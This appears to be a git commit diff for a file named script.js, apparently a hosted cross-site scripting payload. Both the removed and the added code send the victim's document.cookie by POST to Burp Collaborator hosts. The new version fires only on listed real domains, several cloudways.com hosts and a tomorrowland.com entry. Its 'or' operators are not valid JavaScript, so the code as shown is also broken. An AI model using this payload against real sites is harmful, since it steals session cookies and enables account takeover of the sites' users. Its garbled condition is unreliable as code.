8b9aa282e1baf853d98b1ec93025f46889a3812f
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2022-11-30 20:25:33 +0330

    Update script.js

--- script.js
+++ script.js
@@ -1,5 +1,7 @@
-fetch('https://d9njln2aljyc52i7c3bygm6ocfi56u.burpcollaborator.net', {
-method: 'POST',
-mode: 'no-cors',
-body:document.cookie
+if (document.domain == "platform.cloudways.com" or document.domain == "www.cloudways.com" or document.domain == "api.cloudways.com" or document.domain == "developers.cloudways.com" or document.domain == " www.tomorrowland.com ") {
+  fetch('https://b5htwifvqnphcg2tb08njkx0rrxil7.burpcollaborator.net', {
+  method: 'POST',
+  mode: 'no-cors',
+  body:document.cookie
 });
+}
